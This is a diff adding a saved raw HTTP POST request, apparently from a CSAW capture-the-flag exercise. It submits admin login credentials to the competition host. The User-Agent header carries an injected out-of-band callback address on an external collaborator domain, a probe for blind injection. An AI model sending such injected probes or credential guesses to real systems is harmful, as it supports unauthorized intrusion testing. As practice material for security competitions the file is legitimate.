@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: web.csaw.io:5800
+Content-Length: 51
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@wkkernrm7jcjjxl9w1hr7bf88zeq6quf.oastify.com
+
+email=admin&password=meowmeowmeow
